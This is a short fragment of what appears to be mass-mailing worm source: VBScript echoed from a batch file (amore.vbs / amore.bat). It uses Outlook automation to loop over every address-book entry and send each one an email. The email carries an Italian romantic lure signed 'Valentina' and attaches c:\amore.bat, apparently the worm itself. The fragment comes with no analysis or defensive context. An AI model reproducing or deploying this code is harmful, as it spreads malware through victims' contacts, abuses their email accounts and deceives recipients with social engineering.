   Set out = CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI") >nul
   For ctrlists = 1 To mapi.AddressLists.Count >nul
   Set a = mapi.AddressLists(ctrlists) >nul
   x = 1 >nul >>amore.vbs
   For ctrentries = 1 To a.AddressEntries.Count >nul
   malead = a.AddressEntries(x) >nul
   Set male = out.CreateItem(0) >nul
   male.Recipients.Add (malead) >nul
   male.Subject = "Sto male senza di TE" >nul
   male.Body = "Ti prego dammi una risposta t.v.b. la tua Valentina" >nul
   male.Attachments.Add ("c:\amore.bat") >nul
   male.Send >nul
   x = x + 1 >nul
   Next >nul
   Next >nul
   Set out = Nothing >nul
   Set mapi = Nothing >nul
